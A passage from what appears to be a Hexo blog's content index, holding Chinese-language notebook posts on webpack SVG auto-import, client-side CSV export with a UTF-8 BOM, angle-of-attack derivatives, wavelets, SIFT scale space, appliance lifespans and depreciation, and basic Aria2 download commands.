<h1 id="自动导入多个SVG"><a href="#自动导入多个SVG" class="headerlink" title="自动导入多个SVG"></a>自动导入多个SVG</h1><p>使用 webpack 的 <a href="https://webpack.js.org/guides/dependency-management/#require-context" target="_blank" rel="noopener">require.context</a> 实现自动导入多个SVG Icon，避免手动一个个引入。</p>
<p>require.context有三个参数：</p>
<ul>
<li>directory：说明需要检索的目录</li>
<li>useSubdirectories：是否检索子目录</li>
<li>regExp: 匹配文件的正则表达式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const requireAll &#x3D; requireContext &#x3D;&gt; requireContext.keys().map(requireContext)</span><br><span class="line">const req &#x3D; require.context(&#39;.&#x2F;svg&#39;, false, &#x2F;\.svg$&#x2F;)</span><br><span class="line">requireAll(req)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.im/post/59bb864b5188257e7a427c09" target="_blank" rel="noopener">手摸手，带你优雅的使用 icon</a>,by 花裤衩.</li>
<li><a href="https://www.zhangxinxu.com/wordpress/2014/07/introduce-svg-sprite-technology/?spm=a313x.7781069.1998910419.50" target="_blank" rel="noopener">未来必热：SVG Sprites技术介绍</a>,by 张鑫旭.</li>
<li><a href="https://juejin.im/post/5c049a28f265da61273d2317" target="_blank" rel="noopener">如何在vue项目中优雅的使用SVG</a>,by SilentLove.</li>
<li><a href="https://juejin.im/post/5c10dbcbf265da61441fe8e2" target="_blank" rel="noopener">关于webpack的require.context</a>,by yeyan1996.</li>
<li><a href="https://blog.csdn.net/qq_21567385/article/details/107626075" target="_blank" rel="noopener">requireContext.keys().map(requireContext)在批量导入时的作用</a>,by 咲奈.</li>
<li><a href="https://www.jianshu.com/p/c894ea00dfec" target="_blank" rel="noopener">使用require.context实现前端工程自动化</a>,by 心_c2a2.</li>
<li><a href="https://webpack.docschina.org/guides/dependency-management/" target="_blank" rel="noopener">webpack依赖管理</a>,by docschina.</li>
<li><a href="https://segmentfault.com/a/1190000015367490" target="_blank" rel="noopener">懒人神器：svg-sprite-loader实现自己的Icon组件</a>,by<br>Yawenina.</li>
<li><a href="https://svgontheweb.com/#implementation" target="_blank" rel="noopener">SVG on the Web – Implementation Options</a>,by svgontheweb.</li>
<li><a href="https://uiset.com/category/icon" target="_blank" rel="noopener">SVG Search</a>,by uiset.</li>
<li><a href="https://www.zhangxinxu.com/wordpress/2014/07/svg-sprites-fill-color-currentcolor/" target="_blank" rel="noopener">SVG图标颜色文字般继承与填充</a>,by 张鑫旭.</li>
<li><a href="https://goodpalette.io/how-to" target="_blank" rel="noopener">How To Create a Beautiful Color Palette for your Website or App</a>,by goodpalette.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>客户端使用JS导出CSV文件及中文乱码问题解决方案</title>
    <url>/2019/08/27/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8JS%E5%AF%BC%E5%87%BACSV%E6%96%87%E4%BB%B6%E5%8F%8A%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>在浏览器端无需服务器端支持，直接将JS Array数据导出成CSV文件并下载，是一个常见的开发需求。具体方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var csvContent&#x3D; this.$refs.flightInfoGrid.exportdata(&#39;csv&#39;)</span><br><span class="line">var link &#x3D; document.createElement(&#39;a&#39;);</span><br><span class="line">&#x2F;&#x2F; &quot;\ufeff&quot;是为了解决CSV中文乱码问题</span><br><span class="line">var blob &#x3D; new Blob([&quot;\ufeff&quot; +csvContent],&#123;type: &#39;text&#x2F;csv;charset&#x3D;utf-8;&#39;&#125;);</span><br><span class="line">var url &#x3D; URL.createObjectURL(blob);</span><br><span class="line">link.href &#x3D; url;</span><br><span class="line">link.setAttribute(&#39;download&#39;, &#39;FlightInfo.csv&#39;);</span><br><span class="line">link.click();</span><br><span class="line">document.body.removeChild(link);</span><br></pre></td></tr></table></figure>

<h1 id="中文乱码问题分析"><a href="#中文乱码问题分析" class="headerlink" title="中文乱码问题分析"></a>中文乱码问题分析</h1><p>utf-8保存的csv格式要让Excel正常打开的话，必须加入在文件最前面加入BOM(Byte order mark)。</p>
<p>ANSI的话是可以做到正常显示和保存，但是这是有前提的，就是必须在你的电脑（区域和语言设置）把对非Unicode字符处理设置为Chinese，如果是English的话，显示照样是乱码。</p>
<p>Unicode的csv，Excel就根本不支持，打开虽然可以显示不乱码，但是已经不是按逗号显示在不同的单元格里面了，而是按行显示在第一个单元格里面。</p>
<p> BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开头的特殊标记，用来识别Unicode文件的编码类型。具体编码如下表：</p>
<table>
<thead>
<tr>
<th>BOM</th>
<th>Encoding</th>
</tr>
</thead>
<tbody><tr>
<td>EF BB BF</td>
<td>UTF-8</td>
</tr>
<tr>
<td>FE FF</td>
<td>UTF-16 (big-endian)</td>
</tr>
<tr>
<td>FF FE</td>
<td>UTF-16 (little-endian)</td>
</tr>
<tr>
<td>00 00 FE FF</td>
<td>UTF-32 (big-endian)</td>
</tr>
<tr>
<td>FF FE 00 00</td>
<td>UTF-32 (little-endian)</td>
</tr>
</tbody></table>
<p>微软建议所有的 Unicode 文件应该以 ZERO WIDTH NOBREAK SPACE（U+FEFF）字符开头。这作为一个“特征符”来识别文件中使用的编码和字节顺序。BOM的本意不错，但它并不是一个通用标准，从而导致了很多不兼容的问题。</p>
<h1 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h1><p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字元编码，也是一种前缀码。它可以用一至四个字节对Unicode字符集中的所有有效编码点进行编码，属于Unicode标准的一部分，最初由肯·汤普逊和罗布·派克提出。</p>
<p>由于较小值的编码点一般使用频率较高，直接使用Unicode编码效率低下，大量浪费内存空间。UTF-8就是为了解决向后兼容ASCII码而设计，Unicode中前128个字符（与ASCII码一一对应），使用与ASCII码相同的二进制值的单个字节进行编码，这使得原来处理ASCII字元的软体无须或只须做少部份修改，即可继续使用。因此，它逐渐成为电子邮件、网页及其他储存或传送文字优先采用的编码方式。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/oyi319/article/details/6406506" target="_blank" rel="noopener">Excel 2007 打开 UTF-8 编码 CSV 文件的BUG</a>,by oyi319.</li>
<li><a href="https://stackoverflow.com/questions/14964035/how-to-export-javascript-array-info-to-csv-on-client-side" target="_blank" rel="noopener">How to export JavaScript array info to csv (on client side)?</a>,by stackoverflow.</li>
<li><a href="https://my.oschina.net/dawd/blog/801323" target="_blank" rel="noopener">blob 导出csv 用execl打开出现乱码</a>,by 黑魔法.</li>
<li><a href="https://zh.wikipedia.org/zh/UTF-8" target="_blank" rel="noopener">UTF-8</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>如何计算迎角的导数</title>
    <url>/2020/06/29/%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97%E8%BF%8E%E8%A7%92%E7%9A%84%E5%AF%BC%E6%95%B0/</url>
    <content><![CDATA[<p>在Matlab Simulink中使用Digital DATCOM Forces and Moments组件时，需要输入迎角的导数$d\alpha/dt$，可参考<a href="https://aviation.stackexchange.com/questions/63969/what-is-the-time-derivative-of-the-angle-of-attack" target="_blank" rel="noopener">What is the time derivative of the angle of attack?</a>。</p>
<h1 id="迎角定义"><a href="#迎角定义" class="headerlink" title="迎角定义"></a>迎角定义</h1><p>在机体坐标系下，迎角和侧滑角如图1所示。</p>
<p align="center">
    <img src="images/attackOfAngle.png" width="100%" alt="迎角和侧滑角"/>
</p>
<center>图1 迎角和侧滑角</center>

<p>于是，迎角定义为：</p>
<p>$$\alpha = \arctan \left(\frac{w}{u}\right)$$</p>
<p>其中速度分量$u$和$w$是随时间变化的函数。于是迎角的导数为：</p>
<p>$$\frac{d\alpha}{dt} = \frac{1}{1+\frac{w^2}{u^2}} \left(\frac{w}{u}\right)’= \frac{w’u - wu’}{u^2+w^2}$$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://aviation.stackexchange.com/questions/63969/what-is-the-time-derivative-of-the-angle-of-attack" target="_blank" rel="noopener">What is the time derivative of the angle of attack?</a>,by aviation.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title>室内定位技术笔记</title>
    <url>/2022/06/18/%E5%AE%A4%E5%86%85%E5%AE%9A%E4%BD%8D%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>在室内环境无法使用卫星定位时，使用室内定位技术作为卫星定位的辅助定位，解决卫星信号到达地面时较弱、不能穿透建筑物的问题。最终定位物体当前所处的位置。常见的室内无线定位技术还有：Wi-Fi、蓝牙、红外线、超宽带、RFID、ZigBee、动作捕捉 和超声波。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://aijishu.com/a/1060000000190067" target="_blank" rel="noopener">一文看懂UWB室内定位技术</a>,by 马毅煌.</li>
<li><a href="https://baike.baidu.com/item/%E5%AE%A4%E5%86%85%E5%AE%9A%E4%BD%8D/2523239" target="_blank" rel="noopener">室内定位</a>,by 百度百科.</li>
<li><a href="https://zhuanlan.zhihu.com/p/30734122" target="_blank" rel="noopener">8种室内RTLS（实时定位）技术对比</a>,by 万间云.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>如何致富不靠运气</title>
    <url>/2020/05/23/%E5%A6%82%E4%BD%95%E8%87%B4%E5%AF%8C%E4%B8%8D%E9%9D%A0%E8%BF%90%E6%B0%94/</url>
    <content><![CDATA[<blockquote>
<p>美国风险投资家 Naval Ravikant 有一个很有名的长推特，一共40条，题目叫做《如何致富，不靠运气》，谈了他的商业观。</p>
</blockquote>
<p>现摘抄一些令人振聋发聩的观点：</p>
<ul>
<li><p>去寻求财富，而非金钱或地位。财富就是你拥有资产，而资产在你睡觉的时候都还在为你赚钱；金钱是我们转换时间和财富的工具；身份是你在社会等级体系里所处的位置。</p>
</li>
<li><p>你不会通过出租自己的时间而变得富有。你必须拥有产权，也就是生意的一部分，以此才能赢得个人财务自由。</p>
</li>
<li><p>在选择商业合作伙伴的时候，选择那些高智商、精力旺盛的家伙，但在这一切之上，他应该是个<strong>正直诚实</strong>的人。</p>
</li>
<li><p>不要和愤世嫉俗者和悲观主义者合作，因为他们会任由坏事发生，以此证明他们的负面看法是正确的。</p>
</li>
<li><p>学会如何销售，学会如何创建。如果你同时能做到这两件事，你的成功将无可阻挡。</p>
</li>
<li><p>独到知识是那种不可以通过培训而获得的知识。这是因为，如果这种知识可以经由培训而得，那么其他人同样也可以，并且以此取代你。</p>
</li>
<li><p>财富增长需要使用杠杆。商业杠杆有三个来源：1、资本；2、人力；3、复制起来边际成本为零的产品（如：代码和媒体）。</p>
</li>
<li><p>资本和劳动力是需要征得许可才能使用的杠杆。每个人都在追逐资本，但总得有个什么人给你才行；每个人都想要领导其它人，但总得有什么人愿意跟着你才行。</p>
</li>
<li><p>代码和媒体是无需要许可即可使用的杠杆。它们是新贵人群背后的杠杆，你可以通过自己创建的软件和媒体，在睡觉时仍然为你干活。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://new.qq.com/omn/20200413/20200413A0U72C00.html" target="_blank" rel="noopener">和菜头翻译 如何不靠运气致富</a>,by 和菜头.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>小波变换学习笔记</title>
    <url>/2019/07/14/%E5%B0%8F%E6%B3%A2%E5%8F%98%E6%8D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。</p>
<p>小波变化的发展，承袭Gabor transform的局部化思想，并且克服了傅里叶和Gabor transform的部分缺陷，小波变换提供了一个可以调变的时频窗口，窗口的宽度(width)随着频率变化，频率增高时，时间窗口的宽度就会变窄，以提高分辨率．小波在整个时间范围内的振幅平均值为0，具有有限的持续时间和突变的频率与震幅，可以是不规则，或不对称的信号。</p>
<p>小波变换分成两个大类：离散小波变换（DWT） 和连续小波变换（CWT）。两者的主要区别在于，连续变换在所有可能的缩放和平移上操作，而离散变换采用所有缩放和平移值的特定子集。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/22864189" target="_blank" rel="noopener">能不能通俗的讲解下傅立叶分析和小波分析之间的关系？</a>,by zhihu.</li>
<li><a href="https://www.zhihu.com/question/278337954" target="_blank" rel="noopener">什么是线性平稳信号和非线性非平稳信号？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/22450818" target="_blank" rel="noopener">形象易懂讲解算法I——小波变换</a>,by 咚懂咚懂咚.</li>
<li><a href="https://zhuanlan.zhihu.com/p/66189212" target="_blank" rel="noopener">从傅里叶变换进阶到小波变换（一）</a>,by 1335.</li>
<li><a href="https://zhuanlan.zhihu.com/p/34989414" target="_blank" rel="noopener">信号频域分析方法的理解（频谱、能量谱、功率谱、倒频谱、小波分析）</a>,by Mr.括号.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E6%B3%A2%E5%88%86%E6%9E%90" target="_blank" rel="noopener">小波分析</a>,by wikipedia.</li>
<li><a href="http://www.jezzamon.com/fourier/zh-cn.html" target="_blank" rel="noopener">傅里叶变换交互式入门</a>,by Jez Swanson.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>尺度空间理论简介</title>
    <url>/2019/06/22/%E5%B0%BA%E5%BA%A6%E7%A9%BA%E9%97%B4%E7%90%86%E8%AE%BA%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>尺度空间理论最早可以追溯到1962年的T.Iijima最先提出，学术界开始关注尺度空间技术主要在1986年IEEE PAMI上同时刊出的4篇关于尺度空间理论的文章奠定了发展基础。</p>
<p>现实世界中物体只有具备一定的尺度才能够倍人眼所察觉，计算机视觉学术研究就是在不断的尝试与突破来模拟人眼的观察方法。因此，尺度空间就是试图在图像领域中模拟人眼观察物体的概念与方法。</p>
<h1 id="尺度空间理论"><a href="#尺度空间理论" class="headerlink" title="尺度空间理论"></a>尺度空间理论</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>图像的尺度空间是指图像的模糊程度，而非图像的大小。近距离看一个物体和远距离看一个物体，模糊程度是不一样的；从近到远，图像越来越模糊的过程，也是图像的尺度越来越大的过程。</p>
<h2 id="尺度空间的作用"><a href="#尺度空间的作用" class="headerlink" title="尺度空间的作用"></a>尺度空间的作用</h2><ul>
<li><p>用计算机视觉系统分析未知场景时，计算机并不预先知道图像中物体的尺度。需要同时考虑图像在多尺度下的描述，获知感兴趣物体的最佳尺度；</p>
</li>
<li><p>不同的尺度下都有同样的关键点，那么在不同的尺度的输入图像下就都可以检测出来关键点匹配，也就是尺度不变性；</p>
</li>
</ul>
<h2 id="尺度空间的应用"><a href="#尺度空间的应用" class="headerlink" title="尺度空间的应用"></a>尺度空间的应用</h2><ul>
<li>David G. Lowe教授基于描述数字图像局部特征的尺度空间概念，于1999年提出尺度不变特征变换算法（Scale-invariant feature transform，SIFT）；</li>
<li>在信息获取与处理、建筑、城市学等不同学科中，都有类似的概念，或有借用尺度空间的概念与方法的可能；</li>
</ul>
<h1 id="尺度不变特征转换"><a href="#尺度不变特征转换" class="headerlink" title="尺度不变特征转换"></a>尺度不变特征转换</h1><p>尺度不变特征转换(Scale-invariant feature transform 或 SIFT)是一种机器视觉的算法用来侦测与描述影像中的局部性特征，它在空间尺度中寻找极值点，并提取出其位置、尺度、旋转不变数，此算法由 David Lowe 在1999年所发表，2004年完善总结。 [1] 后续的论文中也有许多基于 SIFT 改进的论文，例如 SURF 将 SIFT 的许多过程近似，达到加速的效果；PCA-SIFT利用主成分分析降低描述子的维度，减少内存的使用并加快配对速度。</p>
<p>其应用范围包含物体辨识、机器人地图感知与导航、影像缝合、3D模型建立、手势辨识、影像追踪和动作比对。</p>
<p>此算法有其专利，专利拥有者为 英属哥伦比亚大学。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/Small_Munich/article/details/79968229" target="_blank" rel="noopener">SIFT算法系列之尺度空间</a>,by small_munich.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%B0%BA%E5%BA%A6%E4%B8%8D%E8%AE%8A%E7%89%B9%E5%BE%B5%E8%BD%89%E6%8F%9B" target="_blank" rel="noopener">尺度不变特征转换</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/ronny/p/3886013.html" target="_blank" rel="noopener">尺度空间理论</a>,by ☆Ronny丶.</li>
<li><a href="https://zhuanlan.zhihu.com/p/48594812" target="_blank" rel="noopener">特征点检测一</a>,by 张帅宾.</li>
<li><a href="http://zhaoxuhui.top/blog/2018/01/29/ORB%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96-%E5%8C%B9%E9%85%8D%E5%8F%8A%E5%AE%9E%E7%8E%B0.html" target="_blank" rel="noopener">ORB特征提取、匹配及实现</a>,by zhaoxuhui.</li>
<li><a href="https://senitco.github.io/2017/07/05/image-feature-brief/" target="_blank" rel="noopener">图像特征描述子之BRIEF</a>,by Senit_Co.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>常用二进制比较工具</title>
    <url>/2023/02/05/%E5%B8%B8%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%AF%94%E8%BE%83%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>二进制比较工具可用来快速分析两份二进制文件的差异部分，分析二级制文件是否被修改，或其他用途。常用的二进制比较工具主要有：</p>
<h1 id="Beyond-Compare"><a href="#Beyond-Compare" class="headerlink" title="Beyond Compare"></a>Beyond Compare</h1><h1 id="Hex-Comparison"><a href="#Hex-Comparison" class="headerlink" title="Hex Comparison"></a>Hex Comparison</h1><h1 id="UltraCompare"><a href="#UltraCompare" class="headerlink" title="UltraCompare"></a>UltraCompare</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/Navicat/p/5497453.html" target="_blank" rel="noopener">常见的比较二进制工具有哪些</a>,by markingNavicat.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>家用电器安全使用年限与折旧</title>
    <url>/2018/12/08/%E5%AE%B6%E7%94%A8%E7%94%B5%E5%99%A8%E5%AE%89%E5%85%A8%E4%BD%BF%E7%94%A8%E5%B9%B4%E9%99%90%E4%B8%8E%E6%8A%98%E6%97%A7/</url>
    <content><![CDATA[<p>家用电器都有一定的安全使用年限，超过安全使用年限，家用电器因产品老化将产生如下问题，造成安全隐患：</p>
<ul>
<li>绝缘体老化，产生漏电，导致电磁污染</li>
<li>元器件技术指标严重下降，导致有害物质泄漏，耗电量增加</li>
</ul>
<p>那么家用电器的安全使用年限是多少呢？购买二手家用电器时如何折旧呢？</p>
<h1 id="家用电器安全使用年限"><a href="#家用电器安全使用年限" class="headerlink" title="家用电器安全使用年限"></a>家用电器安全使用年限</h1><p>有关家电安全使用年限的标准通则早已出台，但是针对不同产品的具体年限细则却迟迟未发布。原因主要在于不同产品的使用年限评估难度较大，不同地区的使用差异性也较大，因此就目前而言国内尚无明确的家电使用年限方面的规定，国际通行年限可作参考：</p>
<ul>
<li>电吹风：4年</li>
<li>电热毯：6年</li>
<li>电脑：6年</li>
<li>吸尘器：8年</li>
<li>煤气灶：8年</li>
<li>电热水器：8年</li>
<li>洗衣机：8年</li>
<li>电视：8-10年</li>
<li>空调：8-10年</li>
<li>微波炉：10年</li>
<li>电饭煲：10年</li>
<li>电风扇：10年</li>
<li>冰箱：12-16年</li>
</ul>
<p>家用电器安全使用年限只是最高限定，<strong>如果在使用过程中不注意保养维护，也有可能缩减家用电器的使用寿命</strong>，这就要求用户在日常生活中需要注重维护保养，使家电处于良好的工作环境，确保家电安全“服役”。</p>
<h2 id="家用电器老化特征"><a href="#家用电器老化特征" class="headerlink" title="家用电器老化特征"></a>家用电器老化特征</h2><p>家用电器也有各自的老化特征，当出现以下老化特征时，建议及时保养或更换：</p>
<ol>
<li><p>空调：如果使用多年的空调开始出现制冷或制热变慢，噪音过大，在开机时会出现霉味且出风伴有灰尘，流出黑水，那么用户就应该考虑更换一台新空调。老旧空调此时不仅耗费更多电量，出风还会带有细菌污垢，影响身体健康。</p>
</li>
<li><p>冰箱：平时运行良好的冰箱开始出现制冷效果差，噪音过大，甚至发生轻微颤动时，说明已经老化。若继续使用，耗电量将会加大，食物的储鲜功能也会退化，有时还会出现冰箱制冷剂泄露，污染食材环境的问题。</p>
</li>
<li><p>洗衣机：洗衣机使用超龄的现象在用户中最为常见，判断它已经超龄的方式也最为简单。通常来说，洗衣机出现渗水、漏水、漏电，噪音过大，衣物清洗不净等问题都是达到使用年限的表现，严重时甚至会发生爆炸事件。</p>
</li>
<li><p>电视机：虽然各种类型的平板、投影仪的市场占有率越来越高，但电视机仍然是每个家庭不可或缺的电器之一。日常使用电视时，屏幕色彩暗淡，画面模糊抖动，除了要考虑电视自身质量问题，还要查看电视使用时长是否已经超出使用年限。超龄服役的电视机除了耗电量增加外，自燃或爆炸事故也时有发生。</p>
</li>
<li><p>热水器：热水器超出使用年限后，在运行时会出现异常声音，安全装置也会发生功能异常问题，再加上内胆中日积月累的杂质污垢，不仅会污染水质，还可能因漏电对人体造成伤害。除此之外，超龄热水器还易出现漏水、保温性差以及因内部电器元件老化导致的短路、冒烟等故障。</p>
</li>
</ol>
<p><strong>一旦发现家中电器存在以上类似的老化特征时，最好提前更换产品，以免带来严重后果</strong>。据媒体公开报道，每年我国因家电触电伤亡人数超过1000人，因家电引起的火灾损失更加惊人，而这其中最典型的原因就是家电超龄“使用”。</p>
<h1 id="家用电器折旧"><a href="#家用电器折旧" class="headerlink" title="家用电器折旧"></a>家用电器折旧</h1><p><strong>家用电器折旧可简单按固定资产折旧方法中的直线法，根据家用电器安全使用年限逐年折旧</strong>。</p>
<h2 id="固定资产折旧方法"><a href="#固定资产折旧方法" class="headerlink" title="固定资产折旧方法"></a>固定资产折旧方法</h2><p>固定资产折旧方法（Fixed-assets Depreciation Method），指将应提折旧总额在固定资产各使用期间进行分配时所采用的具体计算方法。折旧是指固定资产由于使用而逐渐磨损所减少的那部分价值。</p>
<p>固定资产的损耗有两种：</p>
<ul>
<li>有形损耗，也称作物质磨损，是由于使用而发生的机械磨损，以及由于自然力的作用所引起的自然损耗。</li>
<li>无形损耗，也称精神磨损，是指科学进步以及劳动生产率提高等原因而引起的固定资产价值的损失。</li>
</ul>
<p>一般情况下，当计算固定资产折旧时，要同时考虑这两种损耗。</p>
<p>固定资产折旧方法可分为三类：</p>
<h3 id="直线法"><a href="#直线法" class="headerlink" title="直线法"></a>直线法</h3><p>直线法（straight-line method）根据固定资产在整个使用寿命中的磨损状态而确定的成本分配结构。直线法依据是，固定资产的使用强度比较平均，而且各期所取得的收入差距不大。在直线法下，折旧金额是时间的线性函数。</p>
<p><strong>直线法折旧公式如下</strong>：</p>
<p>年折旧率 = （1 － 预计净残值率）÷ 预计使用寿命（年）× 100%</p>
<p>月折旧额 = 固定资产原价× 年折旧率 ÷ 12</p>
<p>其中，<strong>净残值是指预计固定资产清理报废时可收回的残值扣除清理费用后的数额</strong>。企业应根据固定资产的性质和使用方式，合理估计固定资产的净残值。</p>
<h3 id="加速折旧法"><a href="#加速折旧法" class="headerlink" title="加速折旧法"></a>加速折旧法</h3><p>加速折旧法也称为快速折旧法或递减折旧法。其特点是：在固定资产有效使用年限的前期多提折旧，后期则少提折旧。从而相对加快折旧的速度，以使固定资产成本在有效使用年限中加快得到补偿。在具体实务中，加速折旧方法又包括年数总和法和双倍余额递减法两种。</p>
<p><strong>年数总和法计算公式如下</strong>：</p>
<p>年折旧率 = 尚可使用寿命/ 预计使用寿命的年数总和 × 100 %</p>
<p>月折旧额 = （固定资产原价 － 预计净残值 ）× 年折旧率 ÷ 12</p>
<p>某设备预计使用5年，则预计使用寿命的年数总和为15（5+4+3+2+1）。第2年时尚可使用寿命为4，此年的年折旧率为4/15。</p>
<p><strong>双倍余额递减法计算公式如下</strong>：</p>
<p>年折旧率 =2÷　预计使用寿命（年）× 100%</p>
<p>月折旧额 = 固定资产净值 × 年折旧率 ÷ 12</p>
<h3 id="产量法"><a href="#产量法" class="headerlink" title="产量法"></a>产量法</h3><p>产量法（production method）根据固定资产的产出量分配其成本的方法。产量法的依据是固定资产的使用寿命主要是受其使用量影响，其合理性取决于三个条件：</p>
<p>（1）固定资产的每期用量波动较大；</p>
<p>（2）固定资产使用期内的产出的每期用量波动较大；</p>
<p>（3）固定资产服务潜力的下降与其使用程序密切相关。</p>
<p>如果符合这三个条件，产量法是最符合配比原则的。反对产量法的人认为，估计固定资产的产出量比估计固定资产的使用年限更加困难，而且很难考虑功能损耗因素。</p>
<p><strong>产量法计算公式如下</strong>：</p>
<p>单位工作量折旧额 = 固定资产原价 × （ 1 － 预计净残值率 ）/ 预计总工作量</p>
<p>某项固定资产月折旧额 = 该项固定资产当月工作量 × 单位工作量折旧额</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/64552198/answer/225583540" target="_blank" rel="noopener">家用电器的使用年限是多久？如何尽可能延长其寿命？</a>,by 海尔智慧生活.</li>
<li><a href="https://baike.baidu.com/item/固定资产折旧方法" target="_blank" rel="noopener">固定资产折旧方法</a>,by 百度百科.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>生活常识</tag>
      </tags>
  </entry>
  <entry>
    <title>开源跨平台下载利器Aria2</title>
    <url>/2019/01/07/%E5%BC%80%E6%BA%90%E8%B7%A8%E5%B9%B3%E5%8F%B0%E4%B8%8B%E8%BD%BD%E5%88%A9%E5%99%A8Aria2/</url>
    <content><![CDATA[<p>长期以来，迅雷一直是我在Windows平台上首选的下载工具。但是随着迅雷软件升级更新后的下载限速和广告推销的愈演愈烈，我终于下定决心卸载了它。下面我推荐一款开源跨平台的下载利器Aria2。</p>
<h1 id="Aria2简介"><a href="#Aria2简介" class="headerlink" title="Aria2简介"></a>Aria2简介</h1><p>Aria2是一款自由、跨平台命令行界面的下载管理器，该软件根据GPLv2许可证进行分发。支持的下载协议有：HTTP、HTTPS、FTP、Bittorrent和Metalink。</p>
<p>不同于Wget这样的的命令行界面下载器，Aria2不仅支持BitTorrent，还能够从各种来源多路检索所请求的文件。包括HTTP，HTTPS，FTP和BitTorrent协议。aria2使用Metalink数据块的校验和自动查验BitTorrent下载的数据部分。</p>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><p>从<a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2官网</a>下载最新Aria2安装包，当前Aria2最新的版本为1.34.0。</p>
<p>将下载的Aria2安装包aria2-1.34.0-win-64bit-build1解压到C盘目录，并将Aria2安装目录添加到Windows环境变量PATH。</p>
<p>重启后，打开Windows终端，即可在命令行中使用Aria2下载文件。</p>
<h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><p>从Web中下载文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c http:&#x2F;&#x2F;example.org&#x2F;mylinux.iso</span><br></pre></td></tr></table></figure>

<p>从2个源下载文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c http:&#x2F;&#x2F;a&#x2F;f.iso ftp:&#x2F;&#x2F;b&#x2F;f.iso</span><br></pre></td></tr></table></figure>

<p>使用2个连接下载文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c -x2 http:&#x2F;&#x2F;a&#x2F;f.iso</span><br></pre></td></tr></table></figure>

<p>BitTorrent下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c http:&#x2F;&#x2F;example.org&#x2F;mylinux.torrent</span><br></pre></td></tr></table></figure>

<p>BitTorrent Magnet URI下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c &#39;magnet:?xt&#x3D;urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&#39;</span><br></pre></td></tr></table></figure>

<p>按照txt中给出的URI下载：</p>
